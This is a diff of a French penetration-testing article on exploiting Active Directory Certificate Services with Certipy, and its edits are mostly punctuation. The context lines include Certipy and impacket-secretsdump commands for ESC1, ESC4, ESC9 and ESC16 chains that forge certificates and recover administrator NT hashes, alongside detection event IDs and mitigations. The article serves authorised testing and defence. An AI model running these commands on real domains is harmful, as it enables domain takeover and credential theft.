@@ -56,8 +56,7 @@
                     <span class="article-tag windows">PKI</span>
                 </div>
                 <h1>AD Certificate Services : Cartographier et exploiter la PKI d'entreprise</h1>
-                <p class="subtitle">Certipy de l'énumération à l'authentification : ESC1, ESC4, ESC8, ESC9 et ESC16 —
-                    avec les chaînes complètes, les conditions d'exploitation et les Event IDs de détection.</p>
+                <p class="subtitle">Certipy de l'énumération à l'authentification : ESC1, ESC4, ESC8, ESC9 et ESC16. Chaînes complètes, conditions d'exploitation et Event IDs de détection.</p>
                 <div class="hero-stats">
                     <div class="hero-stat">
                         <div class="hero-stat-value warning">ESC16</div>
@@ -76,7 +75,7 @@
 
             <div class="article-content">
                 <div class="warning-box">
-                    <strong><i class="fas fa-exclamation-triangle"></i> Avertissement légal</strong> —
+                    <strong><i class="fas fa-exclamation-triangle"></i> Avertissement légal</strong> :
                     Ces techniques sont destinées aux tests d'intrusion autorisés. Les attaques ADCS génèrent des
                     certificats signés par la CA de production : toujours documenter et nettoyer après exploitation.
                 </div>
@@ -85,13 +84,13 @@
 
                 <p>Active Directory Certificate Services est déployé dans la majorité des grandes entreprises Windows,
                     souvent par défaut avec les paramètres d'installation de Windows Server. Le problème : la plupart
-                    des administrateurs traitent ADCS comme une boîte noire — ils savent qu'elle signe des certificats,
+                    des administrateurs traitent ADCS comme une boîte noire. Ils savent qu'elle signe des certificats,
                     pas qu'elle expose des chemins directs vers Domain Admin.</p>
 
                 <p>Contrairement à Kerberoasting ou à l'abus d'ACLs, une exploitation ADCS produit un artefact
-                    légitime : un certificat signé par la CA interne. Ce certificat permet l'authentification
+                    légitime : un certificat signé par la CA interne. Avec lui, on obtient une authentification
                     PKINIT (demande d'un TGT Kerberos) ou, via <code>certipy auth</code>, la récupération directe
-                    du NT hash de n'importe quel compte — y compris Administrator ou krbtgt.</p>
+                    du NT hash de n'importe quel compte, y compris Administrator ou krbtgt.</p>
 
                 <div class="attack-path">
                     <p class="muted-note">Chemin d'attaque typique via ADCS</p>
@@ -120,14 +119,14 @@
                         a ses propres ACLs (qui peut s'inscrire), ses EKU (usages du certificat) et ses flags
                         (est-ce que le demandeur peut spécifier le SAN ?). C'est là que vivent ESC1, ESC2, ESC3, ESC4.</li>
                     <li><strong>Enrollment endpoints :</strong> HTTP (<code>/certsrv</code>), RPC, DCOM. L'endpoint
-                        HTTP accepte l'authentification NTLM par défaut — ce qui ouvre ESC8.</li>
+                        HTTP accepte l'authentification NTLM par défaut, ce qui ouvre ESC8.</li>
                 </ul>
 
                 <div class="info-box">
                     <strong>Extension de sécurité (szOID_NTDS_CA_SECURITY_EXT) :</strong> Introduite en 2022 (KB5014754),
                     cette extension encode le SID de l'utilisateur demandeur directement dans le certificat. Elle
-                    permet au DC de vérifier que le certificat appartient bien au compte qu'il prétend représenter.
-                    Sa désactivation — au niveau template (ESC9) ou au niveau CA (ESC16) — rouvre les attaques
+                    sert au DC à vérifier que le certificat appartient bien au compte qu'il prétend représenter.
+                    Sa désactivation (au niveau template pour ESC9, au niveau CA pour ESC16) rouvre les attaques
                     d'usurpation d'UPN.
                 </div>
 
@@ -220,7 +219,7 @@ certipy find -u '' -p '' -dc-ip 192.168.1.1 -vulnerable</code></pre>
                 <p>C'est la vulnérabilité ADCS la plus directe. Si un template a le flag
                     <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> et que les utilisateurs de faible privilège
                     peuvent s'y inscrire, on peut demander un certificat avec n'importe quel UPN dans le champ
-                    Subject Alternative Name — y compris <code>administrator@corp.local</code>.</p>
+                    Subject Alternative Name, y compris <code>administrator@corp.local</code>.</p>
 
                 <pre><code># 1. Identifier un template ESC1
 certipy find -u user@corp.local -p '&lt;password&gt;' -dc-ip 192.168.1.1 -vulnerable -stdout
@@ -240,15 +239,14 @@ certipy auth -pfx administrator.pfx -dc-ip 192.168.1.1
                 <div class="orange-box">
                     <strong>OPSEC :</strong> La demande de certificat génère l'Event ID <code>4886</code>
                     (certificate requested) sur la CA. Si le template a "Manager Approval" activé, la requête
-                    reste en attente — ESC1 ne fonctionne que si l'enrollment est automatique.
+                    reste en attente. ESC1 ne fonctionne que si l'enrollment est automatique.
                 </div>
 
                 <h2>ESC4 : Write ACL sur un template → ESC1 à la demande</h2>
 
                 <p>ESC4 est indirect mais très courant. Si un compte compromis a
                     <code>WriteProperty</code> ou <code>WriteDacl</code> sur un template, on peut le modifier
-                    pour y activer le flag <code>ENROLLEE_SUPPLIES_SUBJECT</code> — le transformer en ESC1
-                    temporairement, exploiter, puis restaurer.</p>
+                    pour y activer le flag <code>ENROLLEE_SUPPLIES_SUBJECT</code>, le transformer temporairement en ESC1, exploiter, puis restaurer.</p>
 
                 <pre><code># 1. Vérifier les ACLs sur les templates
 certipy find -u user@corp.local -p '&lt;password&gt;' -dc-ip 192.168.1.1 -vulnerable -stdout
@@ -272,7 +270,7 @@ certipy template -u user@corp.local -p '&lt;password&gt;' \
     -configuration VulnerableTemplate.json</code></pre>
 
                 <div class="warning-box">
-                    <strong><i class="fas fa-wrench"></i> Toujours restaurer</strong> —
+                    <strong><i class="fas fa-wrench"></i> Toujours restaurer</strong> :
                     Modifier un template de production impacte tous les clients qui s'y inscrivent.
                     Certipy sauvegarde automatiquement l'état avec <code>-save-old</code>.
                     Ne jamais quitter une mission sans restaurer.
@@ -305,7 +303,7 @@ impacket-secretsdump -hashes :&lt;NT hash&gt; 'corp.local/dc01$@192.168.1.1'</co
 
                 <div class="info-box">
                     <strong>Prérequis ESC8 :</strong> La CA doit avoir l'enrollment web activé (IIS + certsrv).
-                    Vérifier avec <code>certipy find</code> — la section CA indique les endpoints actifs.
+                    Vérifier avec <code>certipy find</code> : la section CA indique les endpoints actifs.
                     Extended Protection for Authentication (EPA) bloque le relay si activé.
                 </div>
 
@@ -314,7 +312,7 @@ impacket-secretsdump -hashes :&lt;NT hash&gt; 'corp.local/dc01$@192.168.1.1'</co
                 <p>Ces deux variantes exploitent l'absence de l'extension
                     <code>szOID_NTDS_CA_SECURITY_EXT</code>, qui encode normalement le SID du demandeur dans
                     le certificat. Sans cette extension, le DC ne peut pas vérifier que le porteur du certificat
-                    correspond bien au compte référencé dans l'UPN — ce qui permet un swap d'identité.</p>
+                    correspond bien au compte référencé dans l'UPN. Le swap d'identité redevient possible.</p>
 
                 <p><strong>Condition commune :</strong> avoir <code>GenericWrite</code> (ou équivalent) sur un
                     compte de service ou un compte utilisateur cible.</p>
@@ -336,7 +334,7 @@ certipy req -u target_account@corp.local -p '&lt;target-password&gt;' \
 certipy account update -u user@corp.local -p '&lt;password&gt;' \
     -user target_account -upn target_account@corp.local
 
-# 5. Authentifier avec le certificat — le DC voit "administrator" dans l'UPN
+# 5. Authentifier avec le certificat : le DC voit "administrator" dans l'UPN
 certipy auth -pfx administrator.pfx -domain corp.local -dc-ip 192.168.1.1</code></pre>
 
                 <pre><code># --- ESC16 : Extension de sécurité désactivée au niveau CA ---
@@ -353,7 +351,7 @@ certipy find -u user@corp.local -p '&lt;password&gt;' -dc-ip 192.168.1.1 -stdout
                 <div class="purple-box">
                     <strong>ESC16 vs ESC9 :</strong> ESC9 est une désactivation au niveau template
                     (le flag <code>CT_FLAG_NO_SECURITY_EXTENSION</code> dans les propriétés du template).
-                    ESC16 est une désactivation globale au niveau de la CA — elle affecte tous les
+                    ESC16 est une désactivation globale au niveau de la CA. Elle affecte tous les
                     templates et est donc plus impactante. Les deux nécessitent un GenericWrite sur
                     le compte cible pour modifier l'UPN.
                 </div>
@@ -362,7 +360,7 @@ certipy find -u user@corp.local -p '&lt;password&gt;' -dc-ip 192.168.1.1 -stdout
 
                 <p>Une fois un certificat obtenu (quelle que soit la variante ESC), <code>certipy auth</code>
                     effectue une authentification PKINIT (Kerberos avec clé publique). En cas de succès, le DC
-                    retourne un TGT et, dans la réponse AS-REP, le NT hash chiffré — que certipy déchiffre
+                    retourne un TGT et, dans la réponse AS-REP, le NT hash chiffré. Certipy le déchiffre
                     automatiquement.</p>
 
                 <pre><code># Authentification PKINIT → NT hash
@@ -446,22 +444,22 @@ impacket-secretsdump -hashes :&lt;NT hash&gt; corp.local/administrator@192.168.1
                     <li><strong>Auditer les ACLs des templates</strong> : aucun groupe non-admin ne doit avoir
                         WriteProperty ou WriteDacl sur des templates d'authentification.</li>
                     <li><strong>Manager Approval</strong> : activer l'approbation manuelle sur tous les templates
-                        qui permettent l'enrollment d'utilisateurs de faible privilège.</li>
+                        ouverts à l'enrollment d'utilisateurs de faible privilège.</li>
                 </ul>
 
                 <h2>Ressources</h2>
                 <ul>
                     <li><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank"
-                            rel="noopener">SpecterOps — Certified Pre-Owned (Will Schroeder, Lee Christensen)</a></li>
-                    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy — ly4k</a>
+                            rel="noopener">SpecterOps : Certified Pre-Owned (Will Schroeder, Lee Christensen)</a></li>
+                    <li><a href="https://github.com/ly4k/Certipy" target="_blank" rel="noopener">Certipy : ly4k</a>
                     </li>
                     <li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
-                            target="_blank" rel="noopener">Certipy 4.0 — ESC9, ESC10 (ly4k)</a></li>
+                            target="_blank" rel="noopener">Certipy 4.0 : ESC9, ESC10 (ly4k)</a></li>
                     <li><a href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16"
-                            target="_blank" rel="noopener">KB5014754 — Certificate-based authentication changes</a>
+                            target="_blank" rel="noopener">KB5014754 : Certificate-based authentication changes</a>
                     </li>
                     <li><a href="https://www.thehacker.recipes/ad/movement/ad-cs" target="_blank"
-                            rel="noopener">The Hacker Recipes — AD CS</a></li>
+                            rel="noopener">The Hacker Recipes : AD CS</a></li>
                 </ul>
             </div>
         </article>
